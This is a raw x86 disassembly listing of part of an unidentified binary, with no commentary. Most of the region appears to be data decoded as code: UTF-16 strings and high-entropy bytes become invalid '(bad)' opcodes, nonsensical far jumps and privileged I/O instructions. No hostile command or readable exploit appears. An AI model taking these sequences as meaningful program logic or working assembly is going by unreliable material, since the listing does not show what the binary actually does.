  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	je     0x413bf7
  413bf6:	inc    ebx
  413bf7:	add    BYTE PTR [ecx+0x49],bl
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    dl,ch
  413c45:	adc    DWORD PTR [ebx+0x0],eax
  413c48:	add    BYTE PTR [eax],al
  413c4a:	add    BYTE PTR [eax],al
  413c4c:	inc    esp
  413c4d:	add    BYTE PTR [esi+0x0],al
  413c50:	imul   eax,DWORD PTR [eax],0x4a006f
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	add    BYTE PTR [eax-0x2e23bbe8],bh
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    eax,0xdf000001
  413f0d:	bound  esi,QWORD PTR [ebp+0xce762a1]
  413f13:	and    al,0xdd
  413f15:	jb     0x413f76
  413f17:	sbb    al,0x6f
  413f19:	lahf   
  413f1a:	stos   DWORD PTR es:[edi],eax
  413f1b:	or     DWORD PTR [ebx+ecx*2-0xd0f005b],0x3c
  413f23:	push   edx
  413f24:	dec    ebp
  413f25:	(bad)  
  413f26:	and    esi,edi
  413f28:	pop    es
  413f29:	jmp    0x35c1:0x9fc437f8
  413f30:	aam    0x86
  413f32:	mov    bl,0xd5
  413f34:	push   ebx
  413f35:	mov    ebx,DWORD PTR [ebx]
  413f37:	dec    esi
  413f38:	mov    esi,esp
  413f3a:	xor    BYTE PTR [eax+0x627534c0],al
  413f40:	cld    
  413f41:	mov    dl,0x46
  413f43:	or     eax,0xef40e58c
  413f48:	jp     0x413f91
  413f4a:	pop    ebx
  413f4b:	mov    al,ds:0xf39af92c
  413f50:	test   esi,edx
  413f52:	pop    ebp
  413f53:	push   eax
  413f54:	adc    esi,DWORD PTR [esi+0x2e]
  413f57:	inc    ebx
  413f58:	ror    DWORD PTR [ecx-0xe],cl
  413f5b:	pop    edx
  413f5c:	push   ecx
  413f5d:	lahf   
  413f5e:	inc    ebp
  413f5f:	pop    esp
  413f60:	imul   ebp,DWORD PTR [esi+0x16],0xffffffef
  413f64:	push   eax
  413f65:	mov    DWORD PTR ds:[esi+0x6],esi
  413f69:	mov    ebp,0x5c71ed11
  413f6e:	adc    cl,BYTE PTR [eax]
  413f70:	dec    edx
  413f71:	arpl   WORD PTR [ebp+0x131ec272],dx
  413f77:	ror    BYTE PTR [edx-0x44],cl
  413f7a:	push   cs
  413f7b:	pop    ebp
  413f7c:	and    eax,0x5e97e092
  413f81:	push   edx
  413f82:	pop    esi
  413f83:	xor    esi,DWORD PTR [ebp+0x5b]
  413f86:	test   esp,0xa8887419
  413f8c:	or     ebx,DWORD PTR [edi+ecx*8]
  413f8f:	push   edx
  413f90:	inc    ebp
  413f91:	les    edx,FWORD PTR [edx+edx*8]
  413f94:	xor    edx,edx
  413f96:	adc    esi,ebp
  413f98:	(bad)  
  413f9a:	shl    dl,1
  413f9c:	pop    es
  413f9d:	mov    esi,0xe41fdcea
  413fa2:	mov    gs,WORD PTR [edi]
  413fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa5:	lods   eax,DWORD PTR ds:[esi]
  413fa6:	cmp    eax,0x4dd6c075
  413fab:	push   edi
  413fac:	pop    esi
  413fad:	pop    edi
  413fae:	retf   0x150c
  413fb1:	test   al,0x67
  413fb3:	bound  ecx,QWORD PTR [edx]
  413fb5:	fisttp DWORD PTR [ecx]
  413fb7:	rol    DWORD PTR [edx-0x47],cl
  413fba:	sbb    esi,DWORD PTR [edi+0x47e17593]
  413fc0:	sub    BYTE PTR [esi],ch
  413fc2:	leave  
  413fc3:	(bad)  
  413fc5:	dec    ecx
  413fc6:	daa    
  413fc7:	cmp    DWORD PTR [ecx+0x73eb46d7],edi
  413fcd:	sub    BYTE PTR [ebp+0x4f3c9900],ch
  413fd3:	xchg   ebp,eax
  413fd4:	sub    BYTE PTR [esi],cl
  413fd6:	xor    al,0xcc
  413fd8:	aaa    
  413fd9:	or     eax,0xdf22a6d0
  413fde:	mov    ebx,0x26e2e725
  413fe3:	add    esp,ebp
  413fe5:	push   cs
  413fe6:	sub    al,BYTE PTR [eax+0x1c08cd7c]
  413fec:	lock cwde 
  413fee:	jl     0x41405c
  413ff0:	and    BYTE PTR [esi+eax*1],dh
  413ff3:	adc    eax,0x811b0509
  413ff8:	loop   0x41406d
  413ffa:	push   ecx
  413ffb:	add    edi,DWORD PTR [esi-0x56]
  413ffe:	sbb    edi,esp
  414000:	ret    
  414001:	mov    ds:0x3344197,eax
  414006:	shl    DWORD PTR [eax*4-0x7aea648c],1
  41400d:	sub    dl,BYTE PTR [ebx+0x60c4]
	...
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x1ae7:0xe3d52e96
  414083:	pop    esp
  414084:	loope  0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    eax,0x4a000001
  41408d:	dec    ebp
  41408e:	pusha  
  41408f:	xchg   ebp,eax
  414090:	xchg   esi,eax
  414091:	loope  0x4140b6
  414093:	mov    ebp,0x368f74e7
  414098:	pushf  
  414099:	inc    ecx
  41409a:	leave  
  41409b:	xchg   edi,eax
  41409c:	imul   ebp,DWORD PTR [edx],0xbf5b33b6
  4140a2:	mov    edx,0xd8319f63
  4140a7:	dec    eax
  4140a8:	mov    eax,0xf1a7619b
  4140ad:	or     ebp,edi
  4140af:	adc    DWORD PTR [edx],ebp
  4140b1:	(bad)  
  4140b2:	adc    bl,BYTE PTR [edx+0x8]
  4140b5:	sar    BYTE PTR [edx+edx*2-0x34],cl
  4140b9:	sbb    BYTE PTR [eax],cl
  4140bb:	dec    ecx
  4140bc:	or     al,0x99
  4140be:	push   esi
  4140bf:	or     ch,0x1
  4140c2:	ins    DWORD PTR es:[edi],dx
  4140c3:	ins    BYTE PTR es:[edi],dx
  4140c4:	in     al,0xc1
  4140c6:	mov    eax,ds:0x9abf718e
  4140cb:	int3   
  4140cc:	out    0x52,eax
  4140ce:	sbb    dh,BYTE PTR [ecx+0x58c75bd7]
  4140d4:	sub    eax,0x39a64214
  4140d9:	and    dh,BYTE PTR [edx-0x452b6721]
  4140df:	int    0x7b
  4140e1:	xchg   ebx,eax
  4140e2:	dec    eax
  4140e3:	mov    ch,BYTE PTR [edx-0x1b]
  4140e6:	lahf   
  4140e7:	mov    ds:0x1b8895ec,eax
  4140ec:	pusha  
  4140ed:	shl    DWORD PTR [ebx+0x39efc93],cl
  4140f3:	popf   
  4140f4:	sti    
  4140f5:	xchg   ecx,eax
  4140f6:	popa   
  4140f7:	data16 ds clc 
  4140fa:	push   ebx
  4140fb:	mov    cl,0xcd
  4140fd:	jle    0x414085
  4140ff:	cs cli 
  414101:	mov    edi,0x7aa00c27
  414106:	(bad)  [eax]
  414108:	add    DWORD PTR [ebx+eiz*8-0x59],ecx
  41410c:	pushf  
  41410d:	stos   BYTE PTR es:[edi],al
  41410e:	push   ebp
  41410f:	arpl   WORD PTR [edx],si
  414111:	repz loope 0x41409c
  414114:	pop    esi
  414115:	pusha  
  414116:	shl    bh,1
  414118:	jno    0x41413a
  41411a:	cdq    
  41411b:	fsubr  st(4),st
  41411d:	mov    DWORD PTR [ecx+0x46510f2c],ebx
  414123:	mov    ch,0x6c
  414125:	mov    esi,0xcd733968
  41412a:	xchg   esi,eax
  41412b:	xchg   ebp,eax
  41412c:	dec    edx
  41412d:	xchg   ebp,eax
  41412e:	cwde   
  41412f:	inc    esi
  414130:	pop    ebx
  414131:	(bad)  
  414132:	xchg   esp,eax
  414133:	cs sbb eax,0x4685a749
  414139:	mov    esp,0x37fd1858
  41413e:	icebp  
  41413f:	in     eax,0x91
  414141:	loop   0x414111
  414143:	cmp    eax,0xb2dc2e50
  414148:	pop    ecx
  414149:	xchg   ecx,eax
  41414a:	scas   eax,DWORD PTR es:[edi]
  41414b:	mov    ch,0xe9
  41414d:	pop    eax
  41414e:	sub    eax,DWORD PTR [ebx]
  414150:	test   BYTE PTR [edx+ecx*8+0x32],bl
  414154:	push   cs
  414155:	push   esi
  414156:	jle    0x414113
  414158:	xor    al,0x59
  41415a:	stos   BYTE PTR es:[edi],al
  41415b:	cdq    
  41415c:	lahf   
  41415d:	scas   al,BYTE PTR es:[edi]
  41415e:	sti    
  41415f:	mov    bh,0x15
  414161:	mov    al,0xa0
  414163:	xchg   esi,eax
  414164:	mov    al,0xb3
  414166:	cmc    
  414167:	shl    DWORD PTR [ecx+0x50f3df9e],0xb4
  41416e:	popa   
  41416f:	sub    DWORD PTR [ebp+0x26],0x15
  414173:	enter  0xdac,0x23
  414177:	xchg   edi,eax
  414178:	push   0x70
  41417a:	in     al,dx
  41417b:	cmp    eax,0x6b7909e6
  414180:	xor    BYTE PTR [esi-0x53],cl
  414183:	pop    esp
  414184:	leave  
  414185:	loope  0x4141a6
  414187:	pop    esp
  414188:	repnz arpl WORD PTR [edx],si
  41418b:	push   0xffffffa7
  41418d:	out    dx,eax
  41418e:	push   ebp
  41418f:	push   ss
  414190:	xlat   BYTE PTR ds:[ebx]
	...
  4141f1:	add    BYTE PTR [eax],al
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	mov    ds:0xe611b449,eax
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR ds:0x45000001,al
  41420d:	daa    
  41420e:	dec    edx
  41420f:	cmc    
  414210:	aaa    
  414211:	fisttp QWORD PTR [ebx]
  414213:	in     al,0x87
  414215:	xor    DWORD PTR [esi],ebp
  414217:	call   0x9fb4cb24
  41421c:	fstp   DWORD PTR [ecx+ecx*8]
  41421f:	pop    ss
  414220:	mov    cl,0xab
  414222:	arpl   WORD PTR [eax+0x4023f076],sp
  414228:	mov    ds:0x86fcf118,eax
  41422d:	fs dec ebp
  41422f:	push   eax
  414230:	sub    DWORD PTR [esi+0xf],eax
  414233:	in     eax,dx
  414234:	out    dx,al
  414235:	mov    ch,0x84
  414237:	inc    edi
  414238:	xchg   ebp,eax
  414239:	outs   dx,BYTE PTR ds:[esi]
  41423a:	pushf  
  41423b:	inc    ebx
  41423c:	xor    esp,DWORD PTR ds:0xa8c19dda
  414242:	mov    ebx,DWORD PTR [edi-0x7d95ded]
  414248:	sbb    edx,eax
  41424a:	pop    es
  41424b:	cmp    al,0x31
  41424d:	push   cs
  41424e:	test   al,0x8d
  414250:	push   ebx
  414251:	bound  ecx,QWORD PTR [edx+0x12]
  414254:	jmp    0x7b19:0xa9c167c6
  41425b:	inc    esi
  41425c:	pusha  
  41425d:	idiv   DWORD PTR [eax+0x45]
  414260:	in     al,dx
  414261:	pop    edi
  414262:	nop
  414263:	push   ecx
  414264:	ins    DWORD PTR es:[edi],dx
  414265:	out    dx,al
  414266:	mov    esp,esp
  414268:	mov    ds:0x9f8dfab2,eax
  41426d:	push   edx
  41426e:	mov    dl,0x4d
  414270:	out    0xe7,al
  414272:	lds    ebx,FWORD PTR [eax]
  414274:	xor    esi,eax
  414276:	es sub al,0x3d
  414279:	mov    eax,0x98a1bee6
  41427e:	fldenv [eax+0xe3a4718]
  414284:	sub    dh,dl
  414286:	fbstp  TBYTE PTR [esi-0x1ab1e11c]
  41428c:	test   al,0x86
  41428e:	inc    ebx
  41428f:	inc    ebx
  414290:	pusha  
  414291:	hlt    
  414292:	sub    esp,ebp
  414294:	jne    0x414299
  414296:	mov    esp,0xfe371bfc
  41429b:	shl    DWORD PTR [eax+0x1d4c5172],cl
  4142a1:	sub    al,0x78
  4142a3:	pusha  
  4142a4:	in     al,0x67
  4142a6:	push   es
  4142a7:	mov    bl,0x41
  4142a9:	enter  0xfb01,0xcd
  4142ad:	iret   
  4142ae:	(bad)  
  4142af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142b0:	bound  eax,QWORD PTR [edi]
  4142b2:	cdq    
  4142b3:	arpl   si,sp
  4142b5:	cmp    DWORD PTR [ebx+edi*4-0x6e],edi
  4142b9:	cmp    eax,0x6de6657b
  4142be:	int3   
  4142bf:	rcl    BYTE PTR [ecx+0x70145dd5],cl
  4142c5:	jo     0x414295
  4142c7:	int    0xd2
  4142c9:	in     al,0x60
  4142cb:	test   al,0xaa
  4142cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142ce:	pusha  
  4142cf:	je     0x4142e1
  4142d1:	push   0x5158138f
  4142d6:	leave  
  4142d7:	and    eax,DWORD PTR [ebx+0x1d]
  4142da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142db:	rol    DWORD PTR ds:0x1e3b906d,cl
  4142e1:	(bad)  
  4142e2:	or     bl,ah
  4142e4:	ss push 0xe83b97a2
  4142ea:	jge    0x414358
  4142ec:	dec    esi
  4142ed:	fadd   DWORD PTR [esi]
  4142ef:	xor    cl,BYTE PTR [edi]
  4142f1:	sahf   
  4142f2:	inc    ecx
  4142f3:	pop    ebp
  4142f4:	outs   dx,BYTE PTR ds:[esi]
  4142f5:	jmp    0x41434e
  4142f7:	or     BYTE PTR [ebx-0x3905759c],dh
  4142fd:	mov    fs,WORD PTR [ebx]
  4142ff:	rcl    edi,0x99
  414302:	out    dx,eax
  414303:	in     eax,dx
  414304:	add    eax,0x506fcd93
  414309:	inc    edi
  41430a:	fisub  WORD PTR [esi+0x10303633]
  414310:	call   0x0:0x0
	...
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	jle    0x414332
  414382:	jns    0x414319
  414384:	jmp    0x41435a
  414386:	add    BYTE PTR [eax],al
  414388:	add    eax,0x33000001
  41438d:	mov    ds:0x846ad6a3,al
  414392:	loopne 0x41439a
  414394:	out    0x5f,eax
  414396:	xchg   ebx,eax
  414397:	inc    esp
  414398:	and    BYTE PTR [ebx+0x56],al
  41439b:	push   ds
  41439c:	(bad)  
  41439d:	leave  
  41439e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41439f:	or     al,0x99
  4143a1:	fiadd  DWORD PTR [edi+0x10]
  4143a4:	dec    esi
  4143a5:	mov    WORD PTR [esi+0x35],ss
  4143a8:	enter  0x413,0x70
  4143ac:	call   0x88382f83
  4143b1:	fdivr  st,st(3)
  4143b3:	shl    BYTE PTR [esi-0x29873ba7],0xe0
  4143ba:	xor    BYTE PTR [edi],dl
  4143bc:	ret    
  4143bd:	arpl   WORD PTR [ebp-0x2f61aaad],si
  4143c3:	retf   
  4143c4:	jae    0x41441d
  4143c6:	xor    cl,BYTE PTR [esi-0x25831525]
  4143cc:	pop    ecx
  4143cd:	and    ch,al
  4143cf:	jle    0x4143cf
  4143d1:	sub    al,0xc6
  4143d3:	dec    ebx
  4143d4:	call   0xb8084a54
  4143d9:	ret    0xe9f3
  4143dc:	test   al,0x44
  4143de:	(bad)  [esi]
  4143e0:	ss out 0x1e,al
  4143e3:	jmp    0x4143d8
  4143e5:	adc    al,0xc1
  4143e7:	mov    edx,eax
  4143e9:	lods   eax,DWORD PTR ds:[esi]
  4143ea:	enter  0x1dcd,0x6
  4143ee:	(bad)  
  4143ef:	mov    ebx,0x95a2b11e
  4143f4:	mov    ebp,0x51d6b6be
  4143f9:	adc    DWORD PTR [edi+0x59],0xe3c806d
  414400:	sti    
  414401:	jmp    0xa11d:0xea24b631
  414408:	sub    eax,0xc1210314
  41440d:	jl     0x4143bc
  41440f:	push   cs
  414410:	ret    0xb7f2
  414413:	jecxz  0x4143ce
  414415:	mov    WORD PTR [edx+0x55413f7],gs
  41441b:	jp     0x414453
  41441d:	(bad)  
  41441f:	mov    ah,0x80
  414421:	and    dh,BYTE PTR [ecx+eiz*2-0x5d]
  414425:	xchg   ebp,eax
  414426:	cmp    DWORD PTR [esi+0xa],ebx
  414429:	jo     0x41447d
  41442b:	int    0x16
  41442d:	loope  0x4143e1
  41442f:	inc    bx
  414431:	popa   
  414432:	adc    ebp,esp
  414434:	pop    es
  414435:	ret    
  414436:	ja     0x41440f
  414438:	cwde   
  414439:	lock xchg edi,eax
  41443b:	sub    al,0xbe
  41443d:	jecxz  0x4143d5
  41443f:	shl    BYTE PTR [esi-0x8621861],0x4a
  414446:	mov    al,0x11
  414448:	push   0x52
  41444a:	xor    esi,ecx
  41444c:	adc    esp,edi
  41444e:	rcr    ch,0x30
  414451:	ins    BYTE PTR es:[edi],dx
  414452:	xchg   ebp,eax
  414453:	sbb    esp,DWORD PTR [edi+ecx*8]
  414456:	mov    edi,0x2e93136b
  41445b:	jecxz  0x414482
  41445d:	mov    dl,0x6e
  41445f:	test   dh,dl
  414461:	scas   eax,DWORD PTR es:[edi]
  414462:	out    dx,eax
  414463:	imul   esp,edx,0xfffffffd
  414466:	mov    dl,0x53
  414468:	add    BYTE PTR [edi+edx*2-0xd],dh
  41446c:	mov    ds:0x6be95c4e,al
  414471:	xor    edi,edx
  414473:	jle    0x41448a
  414475:	cmp    bh,cl
  414477:	shl    dh,1
  414479:	not    DWORD PTR [edx+0x7b]
  41447c:	leave  
  41447d:	out    0xcf,al
  41447f:	popf   
  414480:	xor    dh,al
  414482:	sbb    al,0x37
  414484:	int3   
  414485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414486:	(bad)  
  414487:	enter  0xe7fd,0x46
  41448b:	outs   dx,BYTE PTR ds:[esi]
  41448c:	mov    esi,DWORD PTR ds:0x97b8ab
	...
  4144f2:	add    BYTE PTR [eax],al
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x78]
